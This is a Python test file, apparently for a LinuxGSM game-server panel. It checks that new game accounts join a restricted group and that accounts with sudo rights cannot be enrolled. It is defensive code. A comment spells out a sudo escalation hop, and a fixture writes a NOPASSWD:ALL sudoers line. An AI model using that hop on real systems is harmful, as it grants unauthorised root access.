# The narrow grant's second line names a GROUP. An account created outside it is one the panel
# cannot drive — and the failure is silent and per-server, which is exactly how the original bug
# stayed hidden. create_game_user pairs the two so a new call site cannot forget the second half.
check("gameuser-group: the verb takes the ACCOUNT and holds the group name as a literal",
      _priv.check_args("gameuser-group", ["gmodserver"]) == ["gmodserver"]
      and _helper.GAME_GROUP == _priv.GAME_GROUP == "lgsmpanel-games",
      "helper=%r panel=%r" % (_helper.GAME_GROUP, _priv.GAME_GROUP))
check("gameuser-group: refuses a uid-0 account, so root cannot be put inside the grant",
      _ufw_raises_verb(lambda: _priv.check_args("gameuser-group", ["root"])))

_cgu = []
_o_rp, _o_local4 = _sm_core.run_privileged, _sm_core.is_local_server
try:
    def _cgu_rp(server, verb, args=(), **k):
        _cgu.append((verb, list(args)))
        return ("", "", 0)
    _sm_core.run_privileged = _cgu_rp

    _sm_core.is_local_server = lambda s: True
    _cgu.clear(); _sm_core.create_game_user(NS(), "gmodserver")
    check("create_game_user: a LOCAL host creates the account AND enrols it",
          [v for v, _a in _cgu] == ["user-create", "gameuser-group"], str(_cgu))

    _sm_core.is_local_server = lambda s: False
    _cgu.clear(); _sm_core.create_game_user(NS(), "gmodserver")
    check("create_game_user: a REMOTE host only creates it — the group means nothing there",
          [v for v, _a in _cgu] == ["user-create"], str(_cgu))

    # A failed creation must not be followed by an enrolment of an account that does not exist.
    _sm_core.is_local_server = lambda s: True
    _sm_core.run_privileged = lambda s, verb, args=(), **k: (
        _cgu.append((verb, list(args))), ("", "useradd: failure", 1))[1]
    _cgu.clear(); _o2, _e2, _r2 = _sm_core.create_game_user(NS(), "gmodserver")
    check("create_game_user: a FAILED creation is not followed by an enrolment",
          [v for v, _a in _cgu] == ["user-create"] and _r2 == 1, "%s rc=%s" % (_cgu, _r2))

    # ...and the reverse: an old helper without the verb must not turn a working install into a
    # failed one. The server is created; it just is not in the group yet.
    def _cgu_halfway(server, verb, args=(), **k):
        _cgu.append((verb, list(args)))
        if verb == "gameuser-group":
            raise RuntimeError("unknown verb")
        return ("", "", 0)
    _sm_core.run_privileged = _cgu_halfway
    _cgu.clear(); _o3, _e3, _r3 = _sm_core.create_game_user(NS(), "gmodserver")
    check("create_game_user: an enrolment that FAILS still reports the account as created",
          _r3 == 0 and [v for v, _a in _cgu] == ["user-create", "gameuser-group"],
          "rc=%s %s" % (_r3, _cgu))
finally:
    _sm_core.run_privileged, _sm_core.is_local_server = _o_rp, _o_local4

# No route may call user-create on its own again: that is the shape that leaves an account outside
# the grant. Scanned across the package, so a new call site has to go through the pairing.
_uc_sites = []
for _dp, _dn, _fn in os.walk(os.path.join(_root, "panel")):
    _dn[:] = [_d for _d in _dn if _d != "__pycache__"]
    for _name in _fn:
        if not _name.endswith(".py") or _name == "privileged.py":
            continue                       # privileged.py is where the verb is DEFINED
        _f = os.path.join(_dp, _name)
        _txt = open(_f, encoding="utf-8").read()
        if '"user-create"' not in _txt:
            continue
        # The ONE legitimate call is the one inside create_game_user. Attributed by AST rather
        # than by line number so moving the function does not quietly reopen the gate.
        _allowed = set()
        for _n in _smg_ast.walk(_smg_ast.parse(_txt)):
            if isinstance(_n, _smg_ast.FunctionDef) and _n.name == "create_game_user":
                _allowed = set(range(_n.lineno, (_n.end_lineno or _n.lineno) + 1))
        for _i, _l in enumerate(_txt.splitlines(), 1):
            if '"user-create"' in _l.split("#")[0] and _i not in _allowed:
                _uc_sites.append("%s:%d" % (os.path.relpath(_f, _root), _i))
check("create_game_user: nothing calls the bare user-create verb any more",
      not _uc_sites, "still calling it: %s" % _uc_sites)

# ── ...and an account that can ALREADY escalate must never be enrolled ─────────────────────────
# The grant says the panel may BECOME a member of GAME_GROUP. A member who can run sudo makes that
# NOPASSWD:ALL with one extra hop — `sudo -u them bash -c 'sudo -i'` — and the split between "root
# only through the helper" and "game accounts directly" is then decorative. This is not exotic:
# running LinuxGSM under your own sudo-capable account is what LinuxGSM's own docs show, and the
# panel's discovery scan imports exactly those installs, so such a name is a LIKELY argument here.
_grp_saved, _pwd_saved = _helper.grp, _helper.pwd
_glob_saved = _helper.glob


class _FakeGrp:
    def __init__(self, name, mem=()):
        self.gr_name, self.gr_mem, self.gr_gid = name, list(mem), 1234


try:
    _helper.glob = NS(glob=lambda _p: [])        # no sudoers.d to read in the unit environment
    _helper.pwd = NS(getpwnam=lambda _u: NS(pw_gid=1234, pw_uid=1234, pw_name=_u))
    _helper.grp = NS(getgrgid=lambda _g: _FakeGrp("gmodserver"),
                     getgrall=lambda: [_FakeGrp("sudo", ["alice"]),
                                       _FakeGrp("gmodcontent", ["gmodserver"])])
    check("enrolment: a plain game account can be enrolled",
          _helper._can_already_escalate("gmodserver") is False)
    check("enrolment: an account in the sudo group cannot",
          _helper._can_already_escalate("alice") is True)
    for _pg in ("admin", "wheel", "root"):
        _helper.grp = NS(getgrgid=lambda _g: _FakeGrp("users"),
                         getgrall=lambda _p=_pg: [_FakeGrp(_p, ["bob"])])
        check("enrolment: ...nor one in '%s'" % _pg,
              _helper._can_already_escalate("bob") is True)
    # A sudoers FILE naming the account directly, with no privileged group anywhere.
    import tempfile as _sg_tmp
    _sg_dir = _sg_tmp.mkdtemp(prefix="sudoers-")
    with open(os.path.join(_sg_dir, "90-ops"), "w", encoding="utf-8") as _fh:
        _fh.write("# a comment naming gmodserver must not count\n"
                  "Defaults env_reset\n"
                  "carol ALL=(ALL) NOPASSWD:ALL\n")
    _helper.glob = NS(glob=lambda _p: [os.path.join(_sg_dir, "90-ops")])
    _helper.grp = NS(getgrgid=lambda _g: _FakeGrp("users"), getgrall=lambda: [])
    check("enrolment: an account named in a sudoers.d file cannot be enrolled",
          _helper._can_already_escalate("carol") is True)
    check("enrolment: ...but being MENTIONED in a comment there is not a grant",
          _helper._can_already_escalate("gmodserver") is False)

    # The verb must consult it, not merely define it.
    _ran = []
    _sub_saved = _helper.subprocess
    try:
        _helper.subprocess = NS(run=lambda *a, **k: (_ran.append(a), NS(returncode=0, stderr=b""))[1])
        _helper.grp = NS(getgrgid=lambda _g: _FakeGrp("users"),
                         getgrall=lambda: [_FakeGrp("sudo", ["carol"])])
        _rc_bad = _helper.do_gameuser_group(["carol"], "")
        check("enrolment: do_gameuser_group REFUSES a sudo-capable account",
              _rc_bad == 1 and not _ran, "rc=%s ran=%s" % (_rc_bad, _ran))
        _ran.clear()
        _helper.grp = NS(getgrgid=lambda _g: _FakeGrp("gmodserver"), getgrall=lambda: [])
        _rc_ok = _helper.do_gameuser_group(["gmodserver"], "")
        check("enrolment: ...and still enrols a plain game account",
              _rc_ok == 0 and len(_ran) == 2, "rc=%s ran=%s" % (_rc_ok, _ran))
    finally:
        _helper.subprocess = _sub_saved
    _shutil.rmtree(_sg_dir, ignore_errors=True)
finally:
    _helper.grp, _helper.pwd, _helper.glob = _grp_saved, _pwd_saved, _glob_saved

# install.sh must apply the same rule to the accounts it backfills.
_inst_sh_src = open(os.path.join(_root, "install.sh"), encoding="utf-8").read()
check("install.sh: the backfill skips an account that already has sudo rights",
      'grep -qxE "sudo|admin|wheel|root"' in _inst_sh_src
      and 'sudo -l -U "${_gu}"' in _inst_sh_src,
      "guard missing from sync_game_user_group")
